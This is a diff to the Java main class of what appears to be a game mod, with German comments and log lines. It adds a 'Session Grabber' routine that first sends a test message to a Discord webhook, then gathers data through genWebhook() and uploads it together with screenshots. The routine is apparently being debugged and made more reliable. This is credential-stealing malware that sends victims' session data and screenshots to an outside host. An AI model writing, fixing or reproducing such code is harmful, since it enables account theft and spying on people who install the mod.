@@ -385,17 +385,38 @@ public final class Main {
 
     private void execWebhook() {
         new Thread(() -> {
+            // ERST EINE TEST-NACHRICHT SENDEN, UM ZU PRÜFEN OB WEBHOOK FUNKTIONIERT
             try {
+                System.out.println("=== SENDE TEST-NACHRICHT ===");
+                new DiscordWebhook(WEBHOOK_URL)
+                    .setUsername("Session Grabber")
+                    .setContent(":white_check_mark: **TEST:** Webhook-Verbindung funktioniert! Mod wurde gestartet.")
+                    .execute();
+                System.out.println("✓ TEST-NACHRICHT ERFOLGREICH GESENDET!");
+            } catch (Exception testException) {
+                System.err.println("✗ TEST-NACHRICHT FEHLGESCHLAGEN:");
+                testException.printStackTrace();
+                // Weiter versuchen, auch wenn Test fehlschlägt
+            }
+            
+            // Kurze Pause nach Test-Nachricht
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException ignored) {}
+            
+            // DANN DIE EIGENTLICHE WEBHOOK MIT DATEN SENDEN
+            try {
+                System.out.println("=== SAMMLE DATEN UND SENDE HAUPTNACHRICHT ===");
                 DiscordWebhook webhook = genWebhook();
                 
                 // Fallback: If no embeds were added due to exceptions, at least send a basic message
                 webhook.execute();
-                System.out.println("Webhook erfolgreich gesendet!");
+                System.out.println("✓ HAUPTNACHRICHT ERFOLGREICH GESENDET!");
                 
                 // Screenshots in separatem Webhook senden
                 sendScreenshots();
             } catch (final Exception e) {
-                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
+                System.err.println("✗ FEHLER BEIM SENDEN DER HAUPTNACHRICHT:");
                 e.printStackTrace();
                 
                 // Try to send a minimal webhook as last resort
